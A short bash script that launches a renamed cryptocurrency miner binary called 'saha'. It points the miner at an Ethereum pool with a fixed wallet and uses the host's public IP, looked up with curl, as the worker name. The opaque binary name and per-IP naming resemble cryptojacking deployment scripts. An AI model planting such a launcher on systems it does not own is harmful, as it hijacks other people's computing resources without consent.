#!/bin/bash
POOL=eth.2miners.com:2020
WALLET=0x491fcd9921b694454fff2882836526177d4317a8
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )

chmod +x saha
./saha --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
